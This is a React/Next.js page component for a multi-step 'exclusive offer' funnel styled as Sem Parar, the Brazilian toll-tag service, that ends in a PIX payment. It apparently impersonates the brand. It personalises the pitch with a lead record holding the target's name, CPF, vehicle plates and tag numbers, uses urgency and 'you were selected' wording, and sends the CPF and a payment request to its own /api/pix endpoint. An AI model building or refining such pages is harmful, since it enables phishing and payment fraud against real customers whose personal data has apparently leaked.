'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';

interface LeadData {
  nrc: number;
  nome: string;
  firstName: string;
  email: string;
  cpf: string;
  cidade: string;
  estado: string;
  placas: string[];
  tags: string[];
  planos: string[];
  qtdVeiculos: number;
  situacao: number;
}

interface PixData {
  id: string;
  qrCodeBase64: string;
  copyPaste: string;
  amount: number;
  expiresAt: string;
}

export default function FunnelClient({ lead }: { lead: LeadData }) {
  const [step, setStep] = useState(1);
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid' | 'expired'>('pending');
  const [formData, setFormData] = useState({
    name: lead.nome || '',
    email: lead.email || '',
    cpf: lead.cpf || '',
  });

  const promoPrice = 29.90;
  const regularPrice = 49.90;
  const monthsFree = lead.qtdVeiculos >= 3 ? 12 : lead.qtdVeiculos >= 2 ? 9 : 6;

  const handleCopyPix = () => {
    if (pixData?.copyPaste) {
      navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const generatePix = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nrc: lead.nrc,
          name: formData.name,
          email: formData.email,
          cpf: formData.cpf,
          amount: promoPrice,
        }),
      });

      if (!response.ok) {
        throw new Error('Falha ao gerar PIX');
      }

      const pix = await response.json();
      setPixData(pix);
      setStep(4);
    } catch (error) {
      alert('Erro ao gerar PIX. Tente novamente.');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!pixData?.id || paymentStatus !== 'pending') return;

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix?id=${pixData.id}`);
        const data = await response.json();

        if (data.status === 'paid' || data.status === 'approved' || data.status === 'completed') {
          setPaymentStatus('paid');
        }
      } catch (error) {
        console.error('Error checking payment status:', error);
      }
    };

    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [pixData?.id, paymentStatus]);

  const nextStep = () => setStep(s => Math.min(s + 1, 4));

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="border-b border-[#e6e6e6]">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
          <Image src="/logo.png" alt="Sem Parar" width={120} height={32} className="h-8 w-auto" />
          <div className="hidden sm:flex items-center gap-6 text-sm text-[#0e0d0d]">
            <span>Para voce</span>
            <span>Para empresas</span>
          </div>
        </div>
      </header>

      {/* Progress */}
      <div className="bg-[#f8f8f8] border-b border-[#e6e6e6]">
        <div className="max-w-[800px] mx-auto px-4 py-4">
          <div className="flex items-center justify-between text-sm">
            {[
              { num: 1, label: 'Oferta' },
              { num: 2, label: 'Beneficios' },
              { num: 3, label: 'Dados' },
              { num: 4, label: 'Pagamento' },
            ].map((s, i) => (
              <div key={s.num} className="flex items-center">
                <div className="flex items-center gap-2">
                  <span className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-semibold ${step >= s.num ? 'bg-[#d60b52] text-white' : 'bg-[#e6e6e6] text-[#999]'}`}>
                    {step > s.num ? '✓' : s.num}
                  </span>
                  <span className={`hidden sm:inline ${step >= s.num ? 'text-[#0e0d0d] font-medium' : 'text-[#999]'}`}>{s.label}</span>
                </div>
                {i < 3 && <div className={`w-8 sm:w-16 h-[2px] mx-2 ${step > s.num ? 'bg-[#d60b52]' : 'bg-[#e6e6e6]'}`} />}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Step 1: Oferta */}
      {step === 1 && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
          <div className="text-center mb-8">
            <span className="inline-block bg-[#d60b52] text-white text-xs font-semibold px-4 py-1.5 rounded-full mb-4">
              OFERTA EXCLUSIVA
            </span>
            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">
              {lead.firstName}, voce foi selecionado!
            </h1>
            <p className="text-[#666] text-base sm:text-lg">
              40% de desconto + adesao e frete gratis
            </p>
          </div>

          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 sm:p-8 mb-6">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-6">
              <div>
                <p className="text-[#999] text-sm mb-1">Plano Sem Parar</p>
                <h2 className="text-[#0e0d0d] text-xl font-bold mb-2">TAG de Pedagio + Estacionamentos</h2>
                <div className="flex items-center gap-3">
                  <span className="text-[#999] text-sm line-through">R$ {regularPrice.toFixed(2).replace('.', ',')}/mes</span>
                  <span className="bg-[#d60b52] text-white text-xs font-semibold px-2 py-0.5 rounded">-40%</span>
                </div>
              </div>
              <div className="text-left sm:text-right">
                <p className="text-[#999] text-xs mb-1">Por apenas</p>
                <p className="text-[#d60b52] text-4xl sm:text-5xl font-bold">
                  R$ {promoPrice.toFixed(2).replace('.', ',')}
                  <span className="text-lg font-normal text-[#666]">/mes</span>
                </p>
                <p className="text-[#666] text-sm mt-1">por {monthsFree} meses</p>
              </div>
            </div>
          </div>

          <div className="bg-[#f0fdf4] border border-[#86efac] rounded-xl p-4 mb-6">
            <p className="text-[#166534] text-sm text-center font-medium">
              Voce economiza R$ {((regularPrice - promoPrice) * monthsFree + 40 + 24.90).toFixed(2).replace('.', ',')} com esta oferta
            </p>
          </div>

          <div className="bg-[#f8f8f8] rounded-xl p-6 mb-8">
            <p className="text-[#999] text-xs font-semibold tracking-wider mb-4">SEU PERFIL SEM PARAR</p>
            <div className="grid grid-cols-3 gap-4 text-center">
              <div>
                <p className="text-[#0e0d0d] text-2xl font-bold">{lead.qtdVeiculos}</p>
                <p className="text-[#666] text-sm">Veiculo{lead.qtdVeiculos !== 1 ? 's' : ''}</p>
              </div>
              <div>
                <p className="text-[#0e0d0d] text-2xl font-bold">{lead.tags.length}</p>
                <p className="text-[#666] text-sm">TAG{lead.tags.length !== 1 ? 's' : ''}</p>
              </div>
              <div>
                <p className="text-[#0e0d0d] text-2xl font-bold">{lead.estado}</p>
                <p className="text-[#666] text-sm">Estado</p>
              </div>
            </div>
          </div>

          <button onClick={nextStep} className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors">
            Quero aproveitar esta oferta
          </button>
          <p className="text-center text-[#999] text-xs mt-4">Sem fidelidade · Cancele quando quiser</p>
        </main>
      )}

      {/* Step 2: Beneficios */}
      {step === 2 && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
          <div className="text-center mb-8">
            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">O que esta incluso</h1>
            <p className="text-[#666] text-base sm:text-lg">Tudo que voce precisa em um so lugar</p>
          </div>

          <div className="space-y-4 mb-8">
            {[
              { title: 'Pedagios', desc: '100% das rodovias pedagiadas do Brasil', icon: '🛣️' },
              { title: 'Estacionamentos', desc: 'Shoppings, aeroportos e hospitais', icon: '🅿️' },
              { title: 'Drive-thrus', desc: "McDonald's, Burger King e mais", icon: '🍔' },
              { title: 'Postos de combustivel', desc: 'Pague com a TAG e acompanhe no app', icon: '⛽' },
              { title: 'Free Flow', desc: 'Passagem automatica sem cancela', icon: '🚗' },
            ].map((item, i) => (
              <div key={i} className="flex items-start gap-4 bg-white border border-[#e6e6e6] rounded-xl p-5">
                <span className="text-2xl">{item.icon}</span>
                <div className="flex-1">
                  <p className="text-[#0e0d0d] font-semibold">{item.title}</p>
                  <p className="text-[#666] text-sm">{item.desc}</p>
                </div>
                <span className="text-[#d60b52] text-xl">✓</span>
              </div>
            ))}
          </div>

          <div className="bg-[#f8f8f8] rounded-xl p-6 mb-8">
            {[
              { label: 'Taxa de adesao', old: 'R$ 40,00', new: 'Gratis' },
              { label: 'Entrega', old: 'R$ 24,90', new: 'Gratis' },
              { label: 'Fidelidade', old: null, new: 'Sem fidelidade' },
            ].map((item, i) => (
              <div key={i} className={`flex items-center justify-between ${i < 2 ? 'mb-4' : ''}`}>
                <span className="text-[#666] text-sm">{item.label}</span>
                <div className="flex items-center gap-2">
                  {item.old && <span className="text-[#999] text-sm line-through">{item.old}</span>}
                  <span className="text-[#0e0d0d] font-semibold">{item.new}</span>
                </div>
              </div>
            ))}
          </div>

          <button onClick={nextStep} className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors mb-3">
            Continuar para pagamento
          </button>
          <button onClick={() => setStep(1)} className="w-full text-[#666] text-sm py-2 hover:text-[#0e0d0d] transition-colors">
            ← Voltar
          </button>
        </main>
      )}

      {/* Step 3: Dados */}
      {step === 3 && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
          <div className="text-center mb-8">
            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">Confirme seus dados</h1>
            <p className="text-[#666] text-base sm:text-lg">Usaremos para gerar seu pagamento</p>
          </div>

          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 sm:p-8 mb-6">
            <div className="space-y-4">
              <div>
                <label className="block text-[#666] text-sm mb-2">Nome completo</label>
                <input
                  type="text"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                  placeholder="Seu nome completo"
                />
              </div>
              <div>
                <label className="block text-[#666] text-sm mb-2">E-mail</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                  placeholder="seu@email.com"
                />
              </div>
              <div>
                <label className="block text-[#666] text-sm mb-2">CPF</label>
                <input
                  type="text"
                  value={formData.cpf}
                  onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                  placeholder="000.000.000-00"
                />
              </div>
            </div>
          </div>

          <div className="bg-[#f8f8f8] rounded-xl p-6 mb-8">
            <div className="flex items-center justify-between mb-2">
              <span className="text-[#666]">Plano Sem Parar</span>
              <span className="text-[#0e0d0d] font-semibold">TAG + Estacionamentos</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-[#666]">Valor</span>
              <span className="text-[#d60b52] font-bold text-xl">R$ {promoPrice.toFixed(2).replace('.', ',')}</span>
            </div>
          </div>

          <button
            onClick={generatePix}
            disabled={loading || !formData.name || !formData.email || !formData.cpf}
            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-3"
          >
            {loading ? 'Gerando PIX...' : 'Finalizar e pagar R$ ' + promoPrice.toFixed(2).replace('.', ',')}
          </button>
          <button onClick={() => setStep(2)} className="w-full text-[#666] text-sm py-2 hover:text-[#0e0d0d] transition-colors">
            ← Voltar
          </button>
          <p className="text-center text-[#999] text-xs mt-4">Pagamento seguro via PIX · Confirmacao instantanea</p>
        </main>
      )}

      {/* Step 4: Pagamento PIX */}
      {step === 4 && (
        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
          {paymentStatus === 'paid' ? (
            <div className="text-center">
              <div className="text-6xl mb-4">✅</div>
              <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">Pagamento confirmado!</h1>
              <p className="text-[#666] text-base sm:text-lg mb-8">
                Obrigado, {lead.firstName}! Sua TAG sera enviada em breve.
              </p>
              <div className="bg-[#f0fff4] border border-[#86efac] rounded-xl p-6">
                <p className="text-[#166534] font-semibold">Enviamos os detalhes para {formData.email}</p>
              </div>
            </div>
          ) : (
            <>
              <div className="text-center mb-8">
                <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">Pague com PIX</h1>
                <p className="text-[#666] text-base sm:text-lg">Escaneie o QR Code ou copie o codigo</p>
              </div>

              <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 sm:p-8 mb-6 text-center">
                <div className="bg-[#f8f8f8] rounded-xl p-6 mb-6 inline-block">
                  {pixData?.qrCodeBase64 ? (
                    <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code PIX" className="w-48 h-48 mx-auto" />
                  ) : (
                    <div className="w-48 h-48 bg-[#e6e6e6] rounded-lg flex items-center justify-center">
                      <span className="text-[#999]">QR Code</span>
                    </div>
                  )}
                </div>

                <div className="mb-6">
                  <p className="text-[#999] text-xs mb-2">Valor</p>
                  <p className="text-[#d60b52] text-3xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
                </div>

                <div className="bg-[#f8f8f8] rounded-xl p-4 mb-4">
                  <p className="text-[#999] text-xs mb-2">PIX Copia e Cola</p>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 text-[#0e0d0d] text-xs break-all bg-white border border-[#e6e6e6] rounded-lg p-3 text-left">
                      {pixData?.copyPaste || 'Gerando codigo...'}
                    </code>
                    <button
                      onClick={handleCopyPix}
                      className="bg-[#0e0d0d] hover:bg-[#333] text-white font-semibold px-4 py-3 rounded-lg transition-colors whitespace-nowrap"
                    >
                      {copied ? 'Copiado!' : 'Copiar'}
                    </button>
                  </div>
                </div>

                <div className="flex items-center justify-center gap-2 text-[#666] text-sm">
                  <div className="w-2 h-2 bg-[#fbbf24] rounded-full animate-pulse"></div>
                  Aguardando pagamento...
                </div>
              </div>

              <button onClick={() => setStep(3)} className="w-full bg-white border border-[#e6e6e6] text-[#666] font-medium text-sm py-3 rounded-xl hover:bg-[#f8f8f8] transition-colors">
                ← Voltar e alterar dados
              </button>
            </>
          )}
        </main>
      )}

      {/* Footer */}
      <footer className="border-t border-[#e6e6e6] mt-auto">
        <div className="max-w-[800px] mx-auto px-4 py-6 text-center">
          <Image src="/logo.png" alt="Sem Parar" width={80} height={24} className="h-6 w-auto mx-auto mb-4 opacity-50" />
          <p className="text-[#999] text-xs mb-2">DBTrans Internet Ltda. · CNPJ 10.558.633/0001-61</p>
          <p className="text-[#ccc] text-xs">
            Oferta valida ate 30/11/2024. Apos o periodo promocional, o valor de R$ {regularPrice.toFixed(2).replace('.', ',')}/mes sera cobrado.
          </p>
        </div>
      </footer>
    </div>
  );
}
